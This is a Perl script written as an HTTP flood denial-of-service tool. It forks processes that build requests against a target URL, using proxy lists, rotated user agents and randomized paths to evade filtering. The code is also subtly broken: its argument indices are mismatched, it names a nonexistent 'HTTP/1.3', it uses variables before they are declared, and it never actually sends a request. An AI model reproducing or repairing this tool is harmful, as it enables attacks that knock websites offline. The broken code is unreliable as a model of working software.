use strict;
use warnings;
use IO::Socket::INET;
use LWP::UserAgent;

die "Usage: perl httpXv2.pl [Method] [Processes] [Target] [Time] [Rate]\n" if scalar @ARGV <= 2;
my %vars_definitions = (
    Objective      => $ARGV[3],
    MethodRequest  => $ARGV[0],
    time           => $ARGV[4],
    process_count  => $ARGV[2],
    rate           => $ARGV[5]
);

my $fileName = __FILE__;
my $file = (split('/', $fileName))[-1];

my $proxies_file = 'proxy.txt';
my $useragents_file = 'ua.txt';

die "Make Sure [$proxies_file], [$useragents_file], & [refer.txt] Are Present.\n" unless (-e $proxies_file && -e $useragents_file);

$SIG{__DIE__} = sub { };

sub getRandomNumberBetween {
    my ($min, $max) = @_;
    return int(rand($max-$min+1) + $min);
}

sub randomString {
    my $length = shift;
    my @chars = ('a'..'z', 'A'..'Z', '0'..'9');
    my $string = '';
    foreach (1..$length) {
        $string .= $chars[rand @chars];
    }
    return $string;
}

sub buildRequest {
    my $path = $vars_definitions{Objective};
    if ($path =~ /\[rand\]/) {
        $path =~ s/\[rand\]/randomString(getRandomNumberBetween(5, 16))/ge;
    }

    my $raw_socket = "$vars_definitions{MethodRequest} $path HTTP/1.3\r\nHost: $parsed.host\r\nReferer: $vars_definitions{Objective}\r\nOrigin: $vars_definitions{Objective}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: $UAs[rand @UAs]\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9,fa-IR;q=0.8,fa;q=0.7,zh-CN;q=0.6,zh;q=0.5,de;q=0.4\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n";
    return $raw_socket;
}

print "Installing Packages...\n" unless eval { require Term::ANSIColor; 1; };
system("cpan install Term::ANSIColor") unless eval { require Term::ANSIColor; 1; };
print "Completed.\n";

open(my $proxies_fh, '<', $proxies_file) or die "Could not open file '$proxies_file' $!";
my @proxies = map { chomp; $_ } <$proxies_fh>;
close($proxies_fh);

open(my $useragents_fh, '<', $useragents_file) or die "Could not open file '$useragents_file' $!";
my @UAs = map { chomp; $_ } <$useragents_fh>;
close($useragents_fh);

my $parsed = URI->new($vars_definitions{Objective});
$vars_definitions{rate}--;

my $numCPUs = $vars_definitions{process_count};
if ($numCPUs <= 1) {
    for (1..$vars_definitions{rate}){
        my $pid = fork();
        if ($pid == 0) {
            buildRequest();
            sleep($vars_definitions{time});
            exit;
        }
    }
} else {
    # Perl doesn't have native support for clustering
    print "Perl does not have native support for clustering.\n";
}

sleep($vars_definitions{time});

exit(1);